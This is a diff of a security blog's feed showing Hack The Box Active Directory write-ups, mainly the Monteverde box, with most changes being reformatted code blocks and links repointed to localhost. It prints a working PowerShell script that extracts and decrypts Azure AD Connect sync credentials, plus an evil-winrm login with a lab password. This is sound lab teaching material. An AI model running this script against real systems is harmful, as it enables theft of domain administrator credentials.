 <p>We login using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to get a <strong>PowerShell</strong> session on the box:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/evil-winrm-access.jpg" alt="evil-winrm-access" /></p>
 
@@ -822,17 +846,18 @@ Host script results:
 
 <p>we take a look at the first 5 lines:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="se">`n</span><span class="s2">"</span><span class="w">
 
-$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
-$client.Open()
-$cmd = $client.CreateCommand()
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
 
-</code></pre></div></div>
+</span></code></pre></div></div>
 
 <p>And start by running the part which defines how the script will connect to the database a.k.a the <strong>“connection string”</strong>.</p>
 
-<p><code class="language-plaintext highlighter-rouge">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
+</span></code></pre></div></div>
 
 <p>which runs okay. Because we’re not really taking any action here. Just initializing an object of the type “System.Data.SqlClient.SqlConnection”. Nothing more.</p>
 
@@ -869,65 +894,65 @@ $cmd = $client.CreateCommand()
   <li>Defining the connection string: we’re connecting to the <strong>ADSync DB</strong> on the <strong>local computer</strong> using <strong>Windows Authentication</strong></li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$connection_string = "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"
-$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection_string
-$client.Open()
-$cmd = $client.CreateCommand()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$connection_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"</span><span class="w">
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nv">$connection_string</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Querying for the important bits to do the decryption: <code class="language-plaintext highlighter-rouge">keyset_id</code>, <code class="language-plaintext highlighter-rouge">instance_id</code> and <code class="language-plaintext highlighter-rouge">entropy</code> from the <code class="language-plaintext highlighter-rouge">mms_server_configuration</code> table</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$key_id = $reader.GetInt32(0)
-$instance_id = $reader.GetGuid(1)
-$entropy = $reader.GetGuid(2)
-$reader.Close()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"</span><span class="w">
+</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+</span><span class="nv">$key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetInt32</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
+</span><span class="nv">$instance_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
+</span><span class="nv">$entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">2</span><span class="p">)</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Obtaining the configuration items: <code class="language-plaintext highlighter-rouge">private_configuration_xml</code> and <code class="language-plaintext highlighter-rouge">encrypted_configuration</code> from the <code class="language-plaintext highlighter-rouge">mms_management_agent</code> table</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd = $client.CreateCommand()
-$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$config = $reader.GetString(0)
-$crypted = $reader.GetString(1)
-$reader.Close()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span><span class="w">
+</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+</span><span class="nv">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
+</span><span class="nv">$crypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Loading the <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> into memory and carrying out the decryption using the keys extracted from <strong>Step #1</strong></li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
-$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
-$km.LoadKeySet($entropy, $instance_id, $key_id)
-$key = $null
-$km.GetActiveCredentialKey([ref]$key)
-$key2 = $null
-$km.GetKey(1, [ref]$key2)
-$decrypted = $null
-$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add-type</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span><span class="w">
+</span><span class="nv">$km</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">LoadKeySet</span><span class="p">(</span><span class="nv">$entropy</span><span class="p">,</span><span class="w"> </span><span class="nv">$instance_id</span><span class="p">,</span><span class="w"> </span><span class="nv">$key_id</span><span class="p">)</span><span class="w">
+</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetActiveCredentialKey</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key</span><span class="p">)</span><span class="w">
+</span><span class="nv">$key2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetKey</span><span class="p">(</span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key2</span><span class="p">)</span><span class="w">
+</span><span class="nv">$decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$key2</span><span class="o">.</span><span class="nf">DecryptBase64ToString</span><span class="p">(</span><span class="nv">$crypted</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$decrypted</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Selecting the domain, username and password from the XML-formatted output and printing them to the screen.</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$domain   = select-xml -Content $config    -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
-$username = select-xml -Content $config    -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
-$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$domain</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-domain']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Domain'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
+</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-user']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Username'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
+</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$decrypted</span><span class="w"> </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//attribute"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Password'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerText</span><span class="p">}}</span><span class="w">
 
-Write-Host ("Domain: "   + $domain.Domain)
-Write-Host ("Username: " + $username.Username)
-Write-Host ("Password: " + $password.Password)
-</code></pre></div></div>
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Domain: "</span><span class="w">   </span><span class="o">+</span><span class="w"> </span><span class="nv">$domain</span><span class="o">.</span><span class="nf">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Username: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$username</span><span class="o">.</span><span class="nf">Username</span><span class="p">)</span><span class="w">
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Password: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$password</span><span class="o">.</span><span class="nf">Password</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
 
 <p><em>With everything in place,</em> we run the script and get a clean set of creds ;]</p>
 
@@ -935,7 +960,7 @@ Write-Host ("Password: " + $password.Password)
 
 <p>The creds are good and the box is <strong>owned</strong> :D</p>
 
-<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="http://localhost:4000/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/13/Certifried</id><content type="html" xml:base="http://localhost:4000/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
 
 <h1 id="the-attack-in-brief">The Attack In Brief</h1>
 <ol>
@@ -1020,7 +1045,7 @@ Write-Host ("Password: " + $password.Password)
   <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
   <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
   <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
-</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
+</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="http://localhost:4000/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/07/Cascade</id><content type="html" xml:base="http://localhost:4000/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1386,7 +1411,7 @@ Host script results:
 
 <p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>
 
-<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="https://omnisl4sh.github.io/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/06/Mantis</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
+<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="http://localhost:4000/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/06/Mantis</id><content type="html" xml:base="http://localhost:4000/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1733,7 +1758,7 @@ Host script results:
 
 <p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>
 
-<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
+<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="http://localhost:4000/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/02/Sizzle</id><content type="html" xml:base="http://localhost:4000/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2106,7 +2131,7 @@ Command=ToggleDesktop
 
 <p>OR…</p>
 
-<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="http://localhost:4000/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/30/Reel</id><content type="html" xml:base="http://localhost:4000/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2481,7 +2506,7 @@ $ErrorActionPreference = 'continue'
 
 <p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>
 
-<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
+<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="http://localhost:4000/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/28/PetitPotam</id><content type="html" xml:base="http://localhost:4000/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
 
 <p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>
 
@@ -2630,7 +2655,7 @@ Luckily enough, with some simple mitigation steps, this can be resolved.</p>
   <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
   <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
   <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
-</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="https://omnisl4sh.github.io/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/25/Resolute</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/25/Resolute.html"><![CDATA[<p><img src="/assets/Resolute/Resolute.png" alt="Resolute" /></p>
+</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="http://localhost:4000/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/25/Resolute</id><content type="html" xml:base="http://localhost:4000/2022/04/25/Resolute.html"><![CDATA[<p><img src="/assets/Resolute/Resolute.png" alt="Resolute" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
